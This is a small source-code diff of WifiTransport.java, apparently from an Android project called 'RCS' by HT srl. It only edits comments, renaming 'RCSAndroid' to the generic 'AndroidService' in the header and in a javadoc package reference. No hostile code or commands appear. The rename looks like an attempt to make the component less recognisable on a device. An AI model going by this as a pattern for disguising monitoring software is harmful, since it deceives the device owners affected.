@@ -1,7 +1,7 @@
 /* *******************************************
  * Copyright (c) 2011
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSAndroid
+ * Project      : RCS, AndroidService
  * File         : WifiTransport.java
  * Created      : Apr 9, 2011
  * Author		: zeno
@@ -49,7 +49,7 @@ public class WifiTransport extends HttpKeepAliveTransport {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#isAvailable()
+	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#isAvailable()
 	 */
 	@Override
 	public boolean isAvailable() {
